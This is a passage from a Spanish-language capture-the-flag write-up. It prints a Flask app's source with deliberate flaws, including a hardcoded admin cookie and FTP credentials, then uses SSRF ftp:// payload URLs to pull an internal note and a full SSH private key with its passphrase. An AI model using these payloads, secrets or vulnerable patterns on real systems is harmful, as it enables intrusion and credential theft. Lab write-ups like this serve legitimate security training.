</span></span><span class=line><span class=cl>        <span class=n>report</span> <span class=o>=</span> <span class=n>get_report_by_id</span><span class=p>(</span><span class=n>report_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;dashboard/report.html&#39;</span><span class=p>,</span> <span class=n>report</span><span class=o>=</span><span class=n>report</span><span class=p>,</span> <span class=n>user_info</span><span class=o>=</span><span class=n>user_info</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@dashboard_bp.route</span><span class=p>(</span><span class=s1>&#39;/delete/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nd>@login_required</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>del_report</span><span class=p>(</span><span class=n>report_id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>user_data</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;user_data&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>user_info</span> <span class=o>=</span> <span class=n>deserialize_user_data</span><span class=p>(</span><span class=n>user_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>user_info</span><span class=p>[</span><span class=s1>&#39;role&#39;</span><span class=p>]</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;admin&#39;</span><span class=p>,</span> <span class=s1>&#39;webdev&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=n>report</span> <span class=o>=</span> <span class=n>delete_report</span><span class=p>(</span><span class=n>report_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;dashboard.dashboard&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@dashboard_bp.route</span><span class=p>(</span><span class=s1>&#39;/resolve&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nd>@login_required</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>resolve</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>report_id</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;report_id&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>resolve_report</span><span class=p>(</span><span class=n>report_id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Report resolved successfully!&#39;</span><span class=p>,</span> <span class=s1>&#39;success&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Error occurred while trying to resolve!&#39;</span><span class=p>,</span> <span class=s1>&#39;error&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;dashboard.dashboard&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@dashboard_bp.route</span><span class=p>(</span><span class=s1>&#39;/change_priority&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nd>@admin_required</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>change_priority</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>user_data</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;user_data&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>user_info</span> <span class=o>=</span> <span class=n>deserialize_user_data</span><span class=p>(</span><span class=n>user_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>user_info</span><span class=p>[</span><span class=s1>&#39;role&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=p>(</span><span class=s1>&#39;webdev&#39;</span> <span class=ow>or</span> <span class=s1>&#39;admin&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Not enough permissions. Only admins and webdevs can change report priority.&#39;</span><span class=p>,</span> <span class=s1>&#39;error&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;dashboard.dashboard&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>report_id</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;report_id&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>priority_level</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;priority_level&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>change_report_priority</span><span class=p>(</span><span class=n>report_id</span><span class=p>,</span> <span class=n>priority_level</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Report priority level changed!&#39;</span><span class=p>,</span> <span class=s1>&#39;success&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Error occurred while trying to change the priority!&#39;</span><span class=p>,</span> <span class=s1>&#39;error&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;dashboard.dashboard&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@dashboard_bp.route</span><span class=p>(</span><span class=s1>&#39;/create_pdf_report&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nd>@admin_required</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_pdf_report</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>pdf_report_path</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>report_url</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;report_url&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>scheme</span> <span class=o>=</span> <span class=n>urlparse</span><span class=p>(</span><span class=n>report_url</span><span class=p>)</span><span class=o>.</span><span class=n>scheme</span>
</span></span><span class=line><span class=cl>            <span class=n>hostname</span> <span class=o>=</span> <span class=n>urlparse</span><span class=p>(</span><span class=n>report_url</span><span class=p>)</span><span class=o>.</span><span class=n>netloc</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>dissallowed_schemas</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>,</span> <span class=s2>&#34;ftp&#34;</span><span class=p>,</span> <span class=s2>&#34;ftps&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>scheme</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>dissallowed_schemas</span><span class=p>)</span> <span class=ow>and</span> <span class=p>((</span><span class=n>socket</span><span class=o>.</span><span class=n>gethostbyname</span><span class=p>(</span><span class=n>hostname</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>])</span> <span class=o>!=</span> <span class=s1>&#39;127.0.0.1&#39;</span><span class=p>)</span> <span class=ow>or</span> <span class=p>(</span><span class=n>hostname</span> <span class=ow>in</span> <span class=n>allowed_hostnames</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=n>scheme</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>urllib_request</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>Request</span><span class=p>(</span><span class=n>report_url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;Cookie&#39;</span><span class=p>:</span> <span class=s1>&#39;user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhM&#39;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>                    <span class=n>response</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=n>urllib_request</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>html_content</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>pdf_filename</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>pdf_report_path</span><span class=si>}</span><span class=s1>/report_</span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>10000</span><span class=p>,</span><span class=mi>90000</span><span class=p>))</span><span class=si>}</span><span class=s1>.pdf&#39;</span>
</span></span><span class=line><span class=cl>                    <span class=n>pdfkit</span><span class=o>.</span><span class=n>from_string</span><span class=p>(</span><span class=n>html_content</span><span class=p>,</span> <span class=n>pdf_filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>send_file</span><span class=p>(</span><span class=n>pdf_filename</span><span class=p>,</span> <span class=n>as_attachment</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Unexpected error!&#39;</span><span class=p>,</span> <span class=s1>&#39;error&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;dashboard/create_pdf_report.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Invalid URL&#39;</span><span class=p>,</span> <span class=s1>&#39;error&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;dashboard/create_pdf_report.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=n>e</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;dashboard/create_pdf_report.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@dashboard_bp.route</span><span class=p>(</span><span class=s1>&#39;/backup&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nd>@admin_required</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>backup</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>source_directory</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>abspath</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=vm>__file__</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;../../../&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>current_datetime</span> <span class=o>=</span> <span class=n>datetime</span><span class=o>.</span><span class=n>now</span><span class=p>()</span><span class=o>.</span><span class=n>strftime</span><span class=p>(</span><span class=s2>&#34;%Y%m</span><span class=si>%d</span><span class=s2>%H%M%S&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>backup_filename</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;app_backup_</span><span class=si>{</span><span class=n>current_datetime</span><span class=si>}</span><span class=s1>.zip&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>zipfile</span><span class=o>.</span><span class=n>ZipFile</span><span class=p>(</span><span class=n>backup_filename</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>,</span> <span class=n>zipfile</span><span class=o>.</span><span class=n>ZIP_DEFLATED</span><span class=p>)</span> <span class=k>as</span> <span class=n>zipf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>root</span><span class=p>,</span> <span class=n>_</span><span class=p>,</span> <span class=n>files</span> <span class=ow>in</span> <span class=n>os</span><span class=o>.</span><span class=n>walk</span><span class=p>(</span><span class=n>source_directory</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>file</span> <span class=ow>in</span> <span class=n>files</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>file_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>root</span><span class=p>,</span> <span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>arcname</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>relpath</span><span class=p>(</span><span class=n>file_path</span><span class=p>,</span> <span class=n>source_directory</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>zipf</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>file_path</span><span class=p>,</span> <span class=n>arcname</span><span class=o>=</span><span class=n>arcname</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>ftp</span> <span class=o>=</span> <span class=n>FTP</span><span class=p>(</span><span class=s1>&#39;ftp.local&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ftp</span><span class=o>.</span><span class=n>login</span><span class=p>(</span><span class=n>user</span><span class=o>=</span><span class=s1>&#39;ftp_admin&#39;</span><span class=p>,</span> <span class=n>passwd</span><span class=o>=</span><span class=s1>&#39;u3jai8y71s2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ftp</span><span class=o>.</span><span class=n>cwd</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>backup_filename</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>ftp</span><span class=o>.</span><span class=n>storbinary</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;STOR </span><span class=si>{</span><span class=n>backup_filename</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ftp</span><span class=o>.</span><span class=n>quit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>backup_filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Backup and upload completed successfully!&#39;</span><span class=p>,</span> <span class=s1>&#39;success&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>flash</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Error: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;error&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;dashboard.dashboard&#39;</span><span class=p>))</span>
</span></span></code></pre></div><p>donde de la l√≠nea:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>ftp</span><span class=o>.</span><span class=n>login</span><span class=p>(</span><span class=n>user</span><span class=o>=</span><span class=s1>&#39;ftp_admin&#39;</span><span class=p>,</span> <span class=n>passwd</span><span class=o>=</span><span class=s1>&#39;u3jai8y71s2&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>tenemos credenciales: <code>ftp_admin:u3jai8y71s2</code>.</p><p>De manera que asumo que el servicio <code>File Transfer Protocol</code> (<code>FTP</code>) est√° corriendo internamente en la m√°quina v√≠ctima. Podemos entonces tratar un <code>Server-Side Request Forgery</code> (<code>SSRF</code>) con el payload/url:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl> ftp://ftp_admin:u3jai8y71s2@ftp.local
</span></span></code></pre></div><p>y obtenemos el output:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>-rw------- 1 root root 2655 May 27 20:05 private-8297.key 
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 root root 15519 May 27 20:05 welcome_note.pdf 
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 root root 1732 May 27 20:05 welcome_note.txt
</span></span></span></code></pre></div><p>where we have a file <code>welcome_note.txt</code> and a private key called <code>private-8297.key</code>.</p><p>Revisando el archivo <code>.txt</code> con el payload/url:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl> ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt
</span></span></code></pre></div><p>Tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Dear Devs, We are thrilled to extend a warm welcome to you as you embark on this exciting journey with us. Your
</span></span><span class=line><span class=cl>arrival marks the beginning of an inspiring chapter in our collective pursuit of excellence, and we are genuinely
</span></span><span class=line><span class=cl>delighted to have you on board. Here, we value talent, innovation, and teamwork, and your presence here reaffirms our
</span></span><span class=line><span class=cl>commitment to nurturing a diverse and dynamic workforce. Your skills, experience, and unique perspectives are
</span></span><span class=line><span class=cl>invaluable assets that will contribute significantly to our continued growth and success. As you settle into your new
</span></span><span class=line><span class=cl>role, please know that you have our unwavering support. Our team is here to guide and assist you every step of the way,
</span></span><span class=line><span class=cl>ensuring that you have the resources and knowledge necessary to thrive in your position. To facilitate your work and
</span></span><span class=line><span class=cl>access to our systems, we have attached an SSH private key to this email. You can use the following passphrase to
</span></span><span class=line><span class=cl>access it, `Y27SH19HDIWD`. Please ensure the utmost confidentiality and security when using this key. If you have any
</span></span><span class=line><span class=cl>questions or require assistance with server access or any other aspect of your work, please do not hesitate to reach out
</span></span><span class=line><span class=cl>for assistance. In addition to your technical skills, we encourage you to bring your passion, creativity, and innovative
</span></span><span class=line><span class=cl>thinking to the table. Your contributions will play a vital role in shaping the future of our projects and products. Once
</span></span><span class=line><span class=cl>again, welcome to your new family. We look forward to getting to know you, collaborating with you, and witnessing
</span></span><span class=line><span class=cl>your exceptional contributions. Together, we will continue to achieve great things. If you have any questions or need
</span></span><span class=line><span class=cl>further information, please feel free to me at adam@comprezzor.htb. Best regards, Adam
</span></span></code></pre></div><p>El mensaje habla de una passphrase que se da para llaves/keys <code>SSH</code> la cual es <code>Y27SH19HDIWD</code>.</p><p>Revisando el archivo <code>private-8297.key</code> con el payload/url:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl> ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key
</span></span></code></pre></div><p>Tenemos la key/llave:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class=line><span class=cl>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDyIVwjHg
</span></span><span class=line><span class=cl>cDQsuL69cF7BJpAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDfUe6nu6ud
</span></span><span class=line><span class=cl>KETqHA3v4sOjhIA4sxSwJOpWJsS//l6KBOcHRD6qJiFZeyQ5NkHiEKPIEfsHuFMzykx8lA
</span></span><span class=line><span class=cl>KK79WWvR0BV6ZwHSQnRQByD9eAj60Z/CZNcq19PHr6uaTRjHqQ/zbs7pzWTs+mdCwKLOU7
</span></span><span class=line><span class=cl>x+X0XGGmtrPH4/YODxuOwP9S7luu0XmG0m7sh8I1ETISobycDN/2qa1E/w0VBNuBltR1BR
</span></span><span class=line><span class=cl>BdDiGObtiZ1sG+cMsCSGwCB0sYO/3aa5Us10N2v3999T7u7YTwJuf9Vq5Yxt8VqDT/t+JX
</span></span><span class=line><span class=cl>U0LuE5xPpzedBJ5BNGNwAPqkEBmjNnQsYlBleco6FN4La7Irn74fb/7OFGR/iHuLc3UFQk
</span></span><span class=line><span class=cl>TlK7LNXegrKxxb1fLp2g4B1yPr2eVDX/OzbqAE789NAv1Ag7O5H1IHTH2BTPTF3Fsm7pk+
</span></span><span class=line><span class=cl>efwRuTusue6fZteAipv4rZAPKETMLeBPbUGoxPNvRy6VLfTLV+CzYGJTdrnNHWYQ7+sqbc
</span></span><span class=line><span class=cl>JFGDBQ+X3QelEAAAWQ+YGB02Ep/88YxudrpfK8MjnpV50/Ew4KtvEjqe4oNL4zLr4qpRec
</span></span><span class=line><span class=cl>80EVZXE2y8k7+2Kqe9+i65RDTpTv+D88M4p/x0wOSVoquD3NNKDSDCmuo0+EU+5WrZcLGT
</span></span><span class=line><span class=cl>ybB8rzzM+RZTm2/XqXvrPPKqtZ9jGIVWhzOirVmbr7lU9reyyotru1RrFDrKSZB4Rju/6V
</span></span><span class=line><span class=cl>YMLzlQ0hG+558YqQ/VU1wrcViqMCAHoKo+kxYBhvA7Pq1XDtU1vLJRhQikg249Iu4NnPtA
</span></span><span class=line><span class=cl>bS5NY4W5E0myaT6sj1Nb7GMlU9aId+PQLxwfPzHvmZArlZBl2EdwOrH4K6Acl/WX2Gchia
</span></span><span class=line><span class=cl>R9Rb3vhhJ9fAP10cmKCGNRXUHgAw3LS/xXbskoaamN/Vj9CHqF1ciEswr0STURBgN4OUO7
</span></span><span class=line><span class=cl>cEH6cOmv7/blKgJUM/9/lzQ0VSCoBiFkje9BEQ5UFgZod+Lw5UVW5JrkHrO4NHZmJR7epT
</span></span><span class=line><span class=cl>9e+7RTOJW1rKq6xf4WmTbEMV95TKAu1BIfSPJgLAO25+RF4fGJj+A3fnIB0aDmFmT4qiiz
</span></span><span class=line><span class=cl>YyJUQumFsZDRxaFCWSsGaTIdZSPzXm1lB0fu3fI1gaJ+73Aat9Z4+BrwxOrQeoSjj6nAJa
</span></span><span class=line><span class=cl>lPmLlsKmOE+50l+kB2OBuqssg0kQHgPmiI+TMBAW71WU9ce5Qpg7udDVPrbkFPiEn7nBxO
</span></span><span class=line><span class=cl>JJEKO4U29k93NK1FJNDJ8VI3qqqDy6GMziNapOlNTsWqRf5mCSWpbJu70LE32Ng5IqFGCu
</span></span><span class=line><span class=cl>r4y/3AuPTgzCQUt78p0NbaHTB8eyOpRwoGvKUQ10XWaFO5IVWlZ3O5Q1JB1vPkxod6YOAk
</span></span><span class=line><span class=cl>wsOvp4pZK/FPi165tghhogsjbKMrkTS1+RVLhhDIraNnpay2VLMOq8U4pcVYbg0Mm0+Qeh
</span></span><span class=line><span class=cl>FYsktA4nHEX5EmURXO2WZgQThZrvfsEK5EIPKFMM7BSiprnoapMMFzKAwAh1D8rJlDsgG/
</span></span><span class=line><span class=cl>Lnw6FPnlUHoSZU4yi8oIras0zYHOQjiPToRMBQQPLcyBUpZwUv/aW8I0BuQv2bbfq5X6QW
</span></span><span class=line><span class=cl>1VjanxEJQau8dOczeWfG55R9TrF+ZU3G27UZVt4mZtbwoQipK71hmKDraWEyqp+cLmvIRu
</span></span><span class=line><span class=cl>eIIIcWPliMi9t+c3mI897sv45XWUkBfv6kNmfs1l9BH/GRrD+JYlNFzpW1PpdbnzjNHHZ3
</span></span><span class=line><span class=cl>NL4dUe3Dt5rGyQF8xpBm3m8H/0bt4AslcUL9RsyXvBK26BIdkqoZHKNyV9xlnIktlVELaZ
</span></span><span class=line><span class=cl>XTrhQOEGC4wqxRSz8BUZOb1/5Uw/GI/cYabJdsvb/QKxGbm5pBM7YRAgmljYExjDavczU4
</span></span><span class=line><span class=cl>AEuCbdj+D8zqvuXgIFlAdgen8ppBob0/CBPqE5pTsuAOe3SdEqEvglTrb+rlgWC6wPSvaA
</span></span><span class=line><span class=cl>rRgthH/1jct9AgmgDd2NntTwi9iXPDqtdx7miMslOIxKJidiR5wg5n4Dl6l5cL+ZN7dT/N
</span></span><span class=line><span class=cl>KdMz9orpA/UF+sBLVMyfbxoPF3Mxz1SG62lVvH45d7qUxjJe5SaVoWlICsDjogfHfZY40P
</span></span><span class=line><span class=cl>bicrjPySOBdP2oa4Tg8emN1gwhXbxh1FtxCcahOrmQ5YfmJLiAFEoHqt08o00nu8ZfuXuI
</span></span><span class=line><span class=cl>9liglfvSvuOGwwDcsv5aVk+DLWWUgWkjGZcwKdd9qBbOOCOKSOIgyZALdLb5kA2yJQ1aZl
</span></span><span class=line><span class=cl>nEKhrdeHTe4Q+HZXuBSCbXOqpOt9KZwZuj2CB27yGnVBAP+DOYVAbbM5LZWvXP+7vb7+BW
</span></span><span class=line><span class=cl>ci+lAtzdlOEAI6unVp8DiIdOeprpLnTBDHCe3+k3BD6tyOR0PsxIqL9C4om4G16cOaw9Lu
</span></span><span class=line><span class=cl>nCzj61Uyn4PfHjPlCfb0VfzrM+hkXus+m0Oq4DccwahrnEdt5qydghYpWiMgfELtQ2Z3W6
</span></span><span class=line><span class=cl>XxwXArPr6+HQe9hZSjI2hjYC2OU=
</span></span><span class=line><span class=cl>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><p>Guardo la key como <code>found_id_rsa</code> y le asigno permisos de ejecuci√≥n con <code>chmod 600 found_id_rsa</code>.</p><p>El problema es que esta key es para alg√∫n usuario, ¬øpero qu√© usuario? Dado que tenemos la passphrase de la key podemos ver detalles de la key usando <code>ssh-keygen</code> junto con las flags <code>-y</code> y <code>-f</code> para obtenerlas:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh-keygen -y -f found_id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Enter passphrase:
